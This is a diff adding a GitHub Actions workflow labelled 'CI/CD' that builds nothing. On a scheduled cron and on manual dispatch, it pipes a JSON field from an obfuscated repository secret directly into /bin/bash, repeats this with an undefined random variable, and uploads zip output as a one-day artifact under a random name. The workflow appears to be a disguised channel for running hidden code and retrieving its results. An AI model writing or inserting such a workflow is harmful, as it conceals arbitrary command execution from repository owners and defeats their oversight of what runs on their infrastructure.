@@ -1,0 +1,27 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          oulmx43: ${{ secrets.oulmx43 }}
+        run: |
+          printf '%s' "$oulmx43" | jq -r .ohn36 | /bin/bash
+          printf '%s' "$fsuuh28637" | jq -r .uhjx81464 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: rok4qaVC
+          path: "*.zip"
+          retention-days: 1
